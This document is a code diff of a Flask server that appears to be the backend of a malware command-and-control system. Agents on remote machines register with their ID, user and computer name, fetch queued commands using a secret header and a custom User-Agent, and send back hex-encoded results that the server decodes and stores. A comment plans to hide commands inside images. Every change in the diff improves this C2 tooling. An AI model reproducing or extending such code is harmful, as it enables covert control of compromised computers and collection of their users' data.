@@ -57,7 +57,7 @@ class Command(db.Model):
 class Results(db.Model):
 
     id = db.Column(db.Integer, primary_key=True)
-    results = db.Column(db.String(4096))
+    results = db.Column(db.Text(4294000000))
 
 
 class Users(db.Model):
@@ -89,7 +89,7 @@ def getGuidList():
     agents_unfiltered = Agents.query.all()
     agents = []
     for x in agents_unfiltered:
-        agents.append(x.username)
+        agents.append(x.guid)
     return agents
 
 
@@ -142,7 +142,7 @@ def register():
         guid = parsed_data[1][5:]
         user = parsed_data[2][5:]
         computer = parsed_data[3][9:]
-        if guid not in getGuidList:
+        if guid not in getGuidList():
             save_agent = Agents(guid=guid, user=user, computer=computer)
             db.session.add(save_agent)
             db.session.commit()
@@ -166,7 +166,8 @@ def getImages():
 @app.route('/commands', methods=['GET', 'POST'])
 def getCommand():
     print("---------------------SECRET KEY-------------------")
-    secretKey = request.headers.get('Authorization')
+    secretKey = str(request.headers.get('Authorization'))
+    imageNum = str(request.headers.get('ImageNum'))
     print("---------------------PASS = " + secretKey + "-------------------")
     # guid = request.args.get('guid')
     if secretKey == password:
@@ -174,14 +175,19 @@ def getCommand():
         userAgent = request.headers.get('User-Agent')
         if userAgent == "Myles920":
             print("---------------------DATA REQUEST-------------------")
-            result = request.data
-            # result_data = base64.b64decode(result).decode('utf-8')
+            results = request.data.decode("utf-8")[4:]
+            hex_data = bytes.fromhex(results)
+            ascii_data = hex_data.decode("ASCII")
+            print("ASCII Data: ", ascii_data)
+            # add the result data to the db if it is not empty
+            if len(ascii_data) > 0:
+                new_results = Results(results=ascii_data)
+                db.session.add(new_results)
+                db.session.commit()
+                print("Result data committed to the db!")
 
-            # new_results = Results(results=result_data)
-            # db.add(new_results)
             # TODO CHANGE THE 'DONE' STATUS OF THE COMMAND TO TRUE, SINCE WE RECEIVED THE RESPONSE
 
-            # db.session.commit()
         task_queue = Command.query.all()
         # TODO CONVERT THESE COMMANDS TO STEGA PICTURES AND STORE THEM IN A FILE? OR MAKE A LIST
 
